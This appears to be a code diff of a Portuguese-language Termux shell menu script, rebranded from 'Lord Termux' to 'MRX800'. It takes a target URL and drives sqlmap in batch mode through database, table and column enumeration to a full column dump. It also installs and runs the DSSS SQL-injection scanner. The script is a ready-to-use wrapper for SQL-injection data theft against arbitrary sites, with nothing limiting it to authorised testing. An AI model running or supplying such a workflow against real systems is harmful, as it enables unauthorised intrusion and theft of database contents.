@@ -4,12 +4,12 @@
 clear
 #
 #Escrever Lord Termux
-figlet Lord Termux
-sleep 4
+figlet MRX800
+sleep 0.5
 #Limpar a tela
 clear
 #Fazendo o programa dormir por 2 segundos
-sleep 2
+sleep 0.3
 #
 #
 figlet SQLord
@@ -31,58 +31,49 @@ read -p "[+]=>" opcao
 #
 #
 if [ "$opcao" = "1" ];then
-
-cd sqlmap
-clear
 figlet Sqlmap
 #
- echo "\033[1;32m\n\n[+]=> INICIANDO SQLMAP AUTOMATICO...";sleep 2
+ echo "\033[1;32m\n\n[+]=> INICIANDO SQLMAP AUTOMATICO...";sleep 0.4
 #
 #Read para digitar a url
 echo "\033[1;36m\n[+]=> DIGITE OU COLE A URL PARA O SQLMAP\033[1;31m"
 read -p "[+]=> " url
 #
 #Começa a listar as databases
-python2 sqlmap.py -u $url --risk 2 --level 2 --batch --dbs --random-agent
+sqlmap -u $url --risk 3 --level 3 --batch --dbs --random-agent
 #
 #Read para digitar o nome da database listada
 echo "\033[1;36m[+]=> DIGITE O NOME DA DATABASE\033[1;31m"
 read -p "[+]=> " db
 #
 #Começa a listar as tabelas
-python2 sqlmap.py -u $url --risk 2 --level 2 --batch -D $db --tables --random-agent 
+sqlmap -u $url --risk 2 --level 2 --batch -D $db --tables --random-agent 
 #
 #Read para digitar o nome da tabela
 echo "\033[1;36m[+]=> DIGITE O NOME DA TABELA\033[1;31m"
 read -p "[+]=> " tabela
 #
 #Começa a listar as colunas
-python2 sqlmap.py -u $url --risk 2 --level 2 --batch -D $db -T $tabela --columns --random-agent 
+sqlmap -u $url --risk 2 --level 2 --batch -D $db -T $tabela --columns --random-agent 
 #
 #Read para digitar o nome da coluna
 echo "\033[1;36m[+]=> DIGITE O NOME DA COLUNA\033[1;31m"
 read -p "[+]=> " coluna
 #
 #Extrai todo o trabalho feito
-python2 sqlmap.py -u $url --risk 2 --level 2 --batch -D $db -T $tabela -C $coluna  --dump
-
+sqlmap -u $url --risk 2 --level 2 --batch -D $db -T $tabela -C $coluna  --dump
 fi
 if [ "$opcao" = "2" ];then
-
-clear
-figlet INSTALL
-git clone https://github.com/sqlmapproject/sqlmap
-
+pkg update
+pkg install upgrade
+pkg install sqlmap -y
 fi
 if [ "$opcao" = "3" ];then
-
 clear
 figlet INSTALL
 git clone https://github.com/stamparm/DSSS
-
 fi
 if [ "$opcao" = "4" ];then
-
 clear
 figlet DSSS
  echo "\033[1;36m[+]=> DIGITE OU COLE A URL DO SITE\033[1;31m"
@@ -93,6 +84,5 @@ read -p "[+]>>" url
 cd DSSS
 #Executando
 python3 dsss.py --url $url
-
 fi
 
